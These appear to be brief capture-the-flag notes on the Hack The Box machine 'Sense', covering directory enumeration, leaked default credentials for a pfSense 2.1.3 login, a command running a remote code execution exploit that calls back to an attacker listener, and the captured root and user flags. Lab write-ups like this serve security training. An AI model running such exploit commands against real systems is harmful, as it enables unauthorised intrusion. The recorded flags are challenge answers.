# 10.10.10.60 - sense
## Port 80 and 443 open
- Port 80 seems to redirect to https
- Gobuster reveals a large amount of information

### /changelog.txt
```
# Security Changelog 

### Issue
There was a failure in updating the firewall. Manual patching is therefore required

### Mitigated
2 of 3 vulnerabilities have been patched.

### Timeline
The remaining patches will be installed during the next maintenance window
```
- *updated 2 of 3 vulns*
### /tree 
- Details about the service running --> SilverStripe
- Possible user: Sam Minnee
- Version tree control is v0.1 - Oct 30th 2005

### /system-users.txt
```
####Support ticket###

Please create the following user


username: Rohit
password: company defaults
```

## The service running is pfsense as per the soruce code
### username: rohit 
### password: pfsense

verion 2.1.3 free bsd

- Remote code execution exploit exists for this specific version

#### how to run it 
```

./code-execution --rhost 10.10.10.60 --lhost 10.10.14.4 --lport 1985 --username rohit --password pfsense

```

## Easy win

# cat root.txt
d08c32a5d4f8c8b10e76eb51a69f1a86


# cat user.txt
8721327cc232073b40d27d9c17e7348b


